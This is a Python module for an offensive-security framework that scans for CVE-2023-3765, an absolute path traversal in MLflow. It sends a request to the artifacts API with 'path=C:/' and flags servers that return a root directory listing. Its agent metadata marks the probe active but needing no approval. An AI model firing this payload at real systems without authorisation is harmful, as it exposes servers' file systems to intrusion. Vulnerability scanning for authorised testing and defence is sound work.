#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Absolute Path Traversal in GitHub repository mlflow/mlflow prior to 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MLflow Absolute Path Traversal Detection',
        'description': 'Absolute Path Traversal in GitHub repository mlflow/mlflow prior to 2.5.0.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'mflow', 'lfi', 'huntr', 'lfprojects', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.tenable.com/cve/CVE-2023-3765',
            'https://huntr.dev/bounties/4be5fd63-8a0a-490d-9ee1-f33dc768ed76',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-3765',
            'https://github.com/mlflow/mlflow/commit/6dde93758d42455cb90ef324407919ed67668b9b',
        ],
        'cve': 'CVE-2023-3765',
    }

    def run(self):
        r = self.http_request(method="GET", path='/ajax-api/2.0/mlflow-artifacts/artifacts?path=C:/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"is_dir":', '"path":', '"files":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="MLflow Absolute Path Traversal detected",
                path='/ajax-api/2.0/mlflow-artifacts/artifacts?path=C:/',
            )
            return True
        return False

